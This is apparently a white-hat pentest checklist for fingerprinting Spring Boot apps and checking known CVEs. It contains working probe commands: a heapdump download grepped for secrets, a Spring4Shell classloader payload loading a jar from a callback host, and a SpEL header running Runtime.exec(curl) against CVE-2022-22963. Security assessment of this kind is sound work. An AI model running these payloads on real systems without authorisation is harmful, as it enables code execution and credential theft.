# Spring Boot — fingerprint→CVE reflex

> Identified Spring Boot → reflex: Actuator exploration + a SpEL probe + version-CVE. White-hat: read-only
> enumeration; confirm SpEL/RCE with an OOB callback (`exec()` returns a Process, not a String — a bare `id`
> is not reflected). Deserialize/RCE classes are described as detection, without a weaponized chain.

## Fingerprint

- **Headers:** `X-Application-Context` (classic), `Server:` often nginx/Tomcat (not indicative).
- **Body:** a `Whitelabel Error Page` on 404/500; a Java stack trace with `org.springframework.*`.
- **Paths:** `/actuator` (or a base `/manage`, `/management`, `/app` + `/actuator`), `/h2-console`,
  `/jolokia`, `/functionRouter`.
- **Version:** a stack trace on a 500 (stale payload) → `Version Information: … Spring Boot`; or
  `/actuator/info`.

## Known-CVE reflexes

- **`/actuator/heapdump` exposure (the class — crown jewel, not a CVE).**
  - Class: a full JVM heap dump → plaintext passwords/tokens/DB creds/private keys from memory.
  - Check: `curl "$BASE/heapdump" -o hd.hprof` → `strings hd.hprof | grep -iE
    "password|secret|api_key|bearer|AKIA[A-Z0-9]{16}|sk_live_"`.
  - Detection Signal: readable creds in the dump = Critical. Mere availability of the dump without extraction
    — prove it with a real secret.

- **`/actuator/env` · `/mappings` · `/beans` · `/shutdown` (the class).**
  - Class: `env` → all env/properties (Spring Boot 2.x+ sanitizes `*password*` by default → you need
    unsanitized ones); `mappings` → the full API surface; `shutdown` (POST) → availability DoS.
  - Check: `curl -H "Accept: application/json" "$BASE/env"` → demand actuator JSON, NOT a Whitelabel/HTML 200
    (Spring returns 200 with a login page on many paths).
  - Detection Signal: JSON with secrets/mappings = a finding; `health`/`info` are public by design — don't report.

- **Spring4Shell — CVE-2022-22965** (Spring Framework `<5.3.18` and `<5.2.20`; requires JDK9+ and WAR-on-Tomcat).
  - Class: data-binding RCE via `class.module.classLoader.*` — manipulating the Tomcat AccessLogValve →
    writing a webshell.
  - Check (non-destructive detection): `curl "<endpoint>" -d
    "class.module.classLoader.URLs[0]=jar:http://<collab>/x.jar!/"` → an OOB hit confirms a reachable
    data-binding. Do NOT write the webshell — detection via the callback is enough.
  - Detection Signal: an OOB callback from a `class.module.classLoader.*` probe on a vulnerable version.

- **Spring Cloud Function SpEL — CVE-2022-22963** (`<3.1.7`, `<3.2.3`).
  - Class: the header `spring.cloud.function.routing-expression` is evaluated as SpEL → RCE.
  - Check: `curl "<host>/functionRouter" -H "spring.cloud.function.routing-expression:
    T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','<collab>/scf'})" -d test`.
  - Detection Signal: an OOB callback = SpEL executed.

- **SpEL injection (the class, any version).**
  - Class: user input in a SpEL context (template `${…}`/`#{…}`, `@Value`, a security expression).
  - Check: `#{7*7}` / `${7*7}` in a field → the response reflects `49`. RCE — only via an OOB `exec(curl …)`.
  - Detection Signal: `49` in the response = SpEL evaluated; an OOB hit = RCE reachability.

- **H2 Console RCE (the class) — `/h2-console`.**
  - Class: an in-memory DB admin UI (default `sa`/empty) → `CREATE ALIAS … Runtime.exec` = RCE.
  - Check: `curl "/h2-console" | grep -i "H2 Console"`; check the UI is reachable and the default creds.
  - Detection Signal: the console is reachable + accepts `sa`/empty = RCE precondition (don't run the ALIAS
    chain — it is proven by access to SQL execution).

- **Jolokia JMX — `/jolokia`, `/actuator/jolokia` (the class).**
  - Class: HTTP access to JMX MBeans → read system properties (creds) → MLet-RCE.
  - Check: `curl "/jolokia/list"` → the MBeans/operations list; `/jolokia/read/java.lang:type=Runtime/SystemProperties`.
  - Detection Signal: the JSON MBean list reachable anonymously = a finding (RCE escalation via MLet — detect
    via access to the exec operations).
